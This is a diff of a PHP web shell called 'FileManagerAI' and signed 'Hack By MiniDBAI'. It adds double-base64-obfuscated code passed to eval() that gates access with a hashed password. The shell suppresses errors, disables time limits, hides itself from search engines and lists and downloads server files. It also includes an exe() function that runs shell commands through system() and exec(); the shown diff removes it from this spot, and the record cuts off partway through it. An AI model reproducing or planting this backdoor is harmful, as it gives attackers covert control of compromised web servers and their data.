@@ -7,25 +7,24 @@ set_time_limit(0);
 @ini_set('max_execution_time', 0);
 @ini_set('output_buffering', 0);
 @ini_set('display_errors', 0);
-
-if (session_status() === PHP_SESSION_NONE) {
-    session_start();
-}
+session_start();
 
 
-$p = "";$p .= "SkdoaGMyaGxaRjl3WVhOeklEMGdKeVF5ZVNReE1DUXpRMGxOTWxCS1FYWndZbWxaVDBSTE9ETm5aVloxTVdOdmIydHJPRms0UlRodGJUSklNRkpxVkRsS1dUTmpRM2RNWmpGVVN5YzdJQXBwWmlBb2FYTnpaWFFvSkY5UVQxTlVXeWR3WVhOemQyOXlaQ2RkS1NrZ2V3b2dJQ0FnSkhCaGMzTjNiM0prSUQwZ0pGOVFUMU5VV3lkd1lYTnpkMjl5WkNkZE93b0tJQ0FnSUM4dklGWmxjbWxtYVd0aGMya2dhR0Z6YUNCd1lYTnpkMjl5WkFvZ0lDQWdhV1lnS0hCaGMzTjNiM0prWDNabGNtbG1lU2drY0dGemMzZHZjbVFzSUNSb1lYTm9aV1JmY0dGemN5a3BJSHNLSUNBZ0lDQWdJQ0FrWDFORlUxTkpUMDViSjJ4dloyZGxaRjlwYmlkZElEMGdkSEoxWlRzS0lDQWdJSDBnWld4elpTQjdDaUFnSUNBZ0lDQWdKR1Z5Y205eUlEMGdJaUk3Q2lBZ0lDQjlDbjA9";$a = "base";$b = "64_decode";$c = $a.$b;$string = $c($p);$string = $c($string);eval($string);
+$one = "";
+$one .= "SkdoaGMyaGxaRjl3WVhOeklEMGdKMlE1T0dSaE16RTVOR0l6TVRNM00ySmpOakpsTTJNNE1ERXlZelV3TVRKaEp6c0tDaTh2SUVaMWJtZHphU0JzYjJkcGJncHBaaUFvYVhOelpYUW9KRjlRVDFOVVd5ZHdZWE56ZDI5eVpDZGRLU2tnZXdvZ0lDQWdKSEJoYzNOM2IzSmtJRDBnSkY5UVQxTlVXeWR3WVhOemQyOXlaQ2RkT3dvS0lDQWdJQzh2SUZabGNtbG1hV3RoYzJrZ2FHRnphQ0J3WVhOemQyOXlaQ0J0Wlc1blozVnVZV3RoYmlCTlJEVUtJQ0FnSUdsbUlDaHRaRFVvSkhCaGMzTjNiM0prS1NBOVBUMGdKR2hoYzJobFpGOXdZWE56S1NCN0NpQWdJQ0FnSUNBZ0pGOVRSVk5UU1U5T1d5ZHNiMmRuWldSZmFXNG5YU0E5SUhSeWRXVTdDaUFnSUNCOUlHVnNjMlVnZXdvZ0lDQWdJQ0FnSUNSbGNuSnZjaUE5SUNJaU93b2dJQ0FnZlFwOUNnb3ZMeUJNYjJkdmRYUUthV1lnS0dsemMyVjBLQ1JmVUU5VFZGc25iRzluYjNWMEoxMHBLU0I3Q2lBZ0lDQnpaWE56YVc5dVgyUmxjM1J5YjNrb0tUc0tJQ0FnSUdobFlXUmxjaWduVEc5allYUnBiMjQ2SUNjZ0xpQWtYMU5GVWxaRlVsc25VRWhRWDFORlRFWW5YU2s3Q2lBZ0lDQmxlR2wwT3dwOQ==";
+$aone = "base";
+$bone = "64_decode";
+$cone = $aone.$bone;
+$stringone = $cone($one);
+$stringone = $cone($stringone);
+eval($stringone);
 
-// Logout
-if (isset($_POST['logout'])) {
-    session_destroy();
-    header('Location: ' . $_SERVER['PHP_SELF']);
-    exit;
-}
 
 // Cek login
 if (!isset($_SESSION['logged_in']) || !$_SESSION['logged_in']) {
-    
+    // Jika belum login, tampilkan form login
     ?>
+
     <!DOCTYPE html>
     <html>
     <head>
@@ -340,7 +339,7 @@ $files = scandir($dir);
 <!DOCTYPE html>
 <html>
 <head>
-    <title>FileManager 😋 MiniDBAI</title>
+    <title>FileManager | MiniDBAI</title>
 <meta name="viewport" content="width=device-width, initial-scale=1.0" />
 <meta name="robots" content="noindex,nofollow">
     <style>
@@ -464,7 +463,7 @@ input[type="submit"]:hover {
 
 </head>
 <body>
-   <center> <h2>FileManagerAI V7</h2> </center>
+   <center> <h2>FileManagerAI V8</h2> </center>
 
 <div>
   <table>
@@ -780,7 +779,7 @@ if (isset($_POST['download_wp'])) {
 <th>
 <div style="text-align: right;">
     <a target="_blank" rel="noopener noreferrer" href="https://bukakartu.id/minidbai">
-        <img src="https://bukakartu.id/assets/img/615845_1725364953.webp" width="109" height="145" alt="Deskripsi Gambar">
+        <img src="data:image/webp;base64,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" width="109" height="145" alt="Deskripsi Gambar">
     <br>Hack By MiniDBAI</a>
 </div>
 </th>
@@ -826,7 +825,7 @@ if (isset($_POST['download_wp'])) {
 if (class_exists('ZipArchive')) {
     echo "<label>ZipArchive <b style='color: #00ad67;'>ON</b></label>";
 } else {
-    echo "<label>ZipArchive <b style='color: red;'>OFF/b></label>";
+    echo "<label>ZipArchive <b style='color: red;'>OFF</b></label>";
 }
 ?>
 
@@ -904,7 +903,7 @@ $pathParts = explode('/', $dir);
 $baseUrl = $_SERVER['REQUEST_SCHEME'] . '://' . $_SERVER['HTTP_HOST'] . strtok($_SERVER['REQUEST_URI'], '?');
 
 // Mulai output HTML
-echo '<h3>📁 : <a href="?dir=/">/</a>';
+echo '<h3> <img src="data:image/webp;base64,UklGRhQBAABXRUJQVlA4WAoAAAAQAAAAGQAAGQAAQUxQSFoAAAABYBvZtpJfBC4RNOEWOlTKEFoLtPJ/hrsTkkXEBIAvWSfwfT/whGdkNpxX4iMZLZeJY9k3dRyo8Grp6rtNit16CKUP1L9AQW8hhSrHcXhxHEsK8H78qs+DLwFWUDgglAAAALAFAJ0BKhoAGgA+tU6hSyckIyGwGAgA4BaJZgCdMxyEIBUkFrzVo0/wXWaWQUNWwKa8S7wuAAD+ixR+N0BcGCL/82B9/ebfsyh13RkX7N9K0ld6lyPo+snWgSX7xJfl43FfhJr/+YNIGmz3hK8nNuJoj/7OQyAKQIBNAffrxDHmQ8K15w5pmAWc9DuGYIDoDJEAAAA=" width="20" height="20"> : <a href="?dir=/">/</a>';
 
 // Variabel untuk menyimpan path saat ini
 $currentPath = '';
@@ -935,7 +934,7 @@ echo '</h3>';
 $direktori_sekarang = getcwd();
 echo "" . htmlspecialchars($direktori_sekarang);
 ?>
-<b><a href="?dir=<?php echo ($direktori_sekarang); ?>/"> [Home]</a></b>🏚️
+<b><a href="?dir=<?php echo ($direktori_sekarang); ?>/"> [Home]</a></b>
 
 <br><br>
 
@@ -951,7 +950,7 @@ echo "" . htmlspecialchars($direktori_sekarang);
     </tr>
 
     <tr>
-        <td><a href="?dir=<?php echo (dirname($dir)) . '/'; ?>">⏪</a></td>
+        <td><a href="?dir=<?php echo (dirname($dir)) . '/'; ?>"> <img src="data:image/webp;base64,UklGRl4DAABXRUJQVlA4WAoAAAAQAAAAJwAAJwAAQUxQSLsBAAANkJ1t2yFJ71euGtt22yFsCGZAG8ZGstec7WVbY7vY/X8Hzb8iiIgJQLvawu0HS7q7+WzTh1RtuqxHgD3DW54UdaakRwBgKoGQoc4UzAgNiSFRmSlYEWKozOTtEE2ZOkczBSdEU1FTO0azeTtAc1Y0UAtc5WY0nXcCNCd7dUpDU+Lo7PdxI5oqOD5a7akkrGZMFP1/1YAmC90+WtbHh/VmgD4wdFxHE4VeD1LtxSUANFbo9yDZXgFotDDkQrbaCxopjLqQrymDxXEXMaTh/JSLWN6auEY8n15wTMoCMQ11islmupfi8Xwl1RWPF//XE04sTt5sJ5NODFicvjpIJBx5AuLo1XEi4cgSHsCHr04TG7ak6i4APnh9mtiwpfDRZwDgvdcXiQ2rJXHjCgBUzxyd/YnqwHuvrjY2rFbcd988aqAAohp1dzcA77y5Sqxbzdh9/y0EwAzBRFqviuZbb6+Ta2YTsHvDXCcY7fLWm5vUmtlE1WpVdJq33tykV80GRFpVdAy89eYms2rUgRTBnYPYeuNlV/Q6MEGm2H7lFxc1gGuhIQW1nVdhacYAn3u9clDdfhmWZw3/l2a0BQBWUDggfAEAAFAJAJ0BKigAKAA+qUifSaYkoyEx2ZwAwBUJagC9eXT+J6le8zFftbuiuo+Kxj5kA9Bo9x57eHmSnS/n7o0NzJ4ZW9XydetQU3waoQExCtuYxVUAAP76Y2tu3J7QJg5ATa/FrTyH6coIEx0Mo0s+4JVtadEbV9Y5L/7BHBGoh/+a3+d5mSF5neUdsswSD9/J34xHa4kXQZqT6b63T6jWvuPL7nNcoeHFO7TRnekIb0m0ABsocK3RbGHD9PXTIU9D2vuPrN7Xufxds2Q7Up98ZgV6V37fYVkjy2jrkFLStK/sFT7YNh+fWcp4bduPCm7wM4vNgCm2xmJ5SZA8ptniO1yD3sToQI9ucaK+L2Q7Ph1XvZ6GQSskIrfbLHoI70Q2nNFafZgwU2GKinbZAbwtQAFKf3/TUHiNPsdiJsxmn2uxkeLmOh/xF//+K2B4PDjXzL7XbfhFzK5rnhysZ92EEJhQ/F/uP+fWWuDU2k/x635/RKbYGOr+qeDqAAAA" width="40" height="40"></a></td>
         <td></td>
         <td></td>
         <td></td>
@@ -989,7 +988,7 @@ echo "" . htmlspecialchars($direktori_sekarang);
     ?>
         <tr>
             <td>
-                <a href="?dir=<?php echo ($dir . $folder . '/'); ?>">📁 <?php echo htmlspecialchars($folder); ?>/</a>
+                <a href="?dir=<?php echo ($dir . $folder . '/'); ?>"> <img src="data:image/webp;base64,UklGRhQBAABXRUJQVlA4WAoAAAAQAAAAGQAAGQAAQUxQSFoAAAABYBvZtpJfBC4RNOEWOlTKEFoLtPJ/hrsTkkXEBIAvWSfwfT/whGdkNpxX4iMZLZeJY9k3dRyo8Grp6rtNit16CKUP1L9AQW8hhSrHcXhxHEsK8H78qs+DLwFWUDgglAAAALAFAJ0BKhoAGgA+tU6hSyckIyGwGAgA4BaJZgCdMxyEIBUkFrzVo0/wXWaWQUNWwKa8S7wuAAD+ixR+N0BcGCL/82B9/ebfsyh13RkX7N9K0ld6lyPo+snWgSX7xJfl43FfhJr/+YNIGmz3hK8nNuJoj/7OQyAKQIBNAffrxDHmQ8K15w5pmAWc9DuGYIDoDJEAAAA=" width="20" height="20"> <?php echo htmlspecialchars($folder); ?>/</a>
             </td>
             <td></td>
             <td><?php echo date("Y-m-d (H:i:s)", filemtime($dir . $folder)); ?></td>
@@ -1016,7 +1015,7 @@ echo "" . htmlspecialchars($direktori_sekarang);
     ?>
         <tr>
             <td>
-                <a href="<?php echo htmlspecialchars($dir . $file); ?>" target="_blank">📋 <?php echo htmlspecialchars($file); ?></a>
+                <a href="<?php echo htmlspecialchars($dir . $file); ?>" target="_blank"> <img src="data:image/webp;base64,UklGRk4BAABXRUJQVlA4IEIBAADwBgCdASoZABgAPrFIn0mnJCMhMBgMAOAWCWYAuwLcC+TzZTxp/RvomdAAVKIm+OfP/v38Tj/xyynInI9VnARAAP75A8ApP2benRY+dpXOJvgei8rLpyiPBsQLmuSz/BxTts5iLKZ+V+2QTUJ8xpz4Y//5wLYvqBJ++aAu2j1gpJwr6O+uF9I9n3vIkM9z+Ud7AuCjg/lRWO/j/7NkrxNYpneqUHeWAN4imutZur+3r/VCKZKGDqInGzzR5Pn/VsQ6Pa+XwtciqRvNR/yBptg7/c1iFQpSnAOaKrJe7YaftkAChK75hqcTA9omOkGgCSJ337gfKTH0J/S3LvTiIyR1cPnj6YVQwAyVfzsE07Wv4OWheN7SOjMwE/WyKLi2m4258Q1sR6hzxWT1iH7/qYf1Tj6geyZrTPf47IehDMOUQAAA" width="20" height="20"> <?php echo htmlspecialchars($file); ?></a>
             </td>
             <td><?php echo number_format(filesize($dir . $file) / 1024, 2) . ' KB'; ?></td>
             <td><?php echo date("Y-m-d (H:i:s)", filemtime($dir . $file)); ?></td>
@@ -1328,39 +1327,15 @@ if (isset($_POST['submit'])) {
     </pre>
 
 
-
 <?php
-
-function exe($cmd) {
-    if (function_exists('system')) {
-        @ob_start();
-        @system($cmd);
-        $buff = @ob_get_contents();
-        @ob_end_clean();
-
-        return $buff;
-    } elseif (function_exists('exec')) {
-        @exec($cmd, $results);
-        $buff = '';
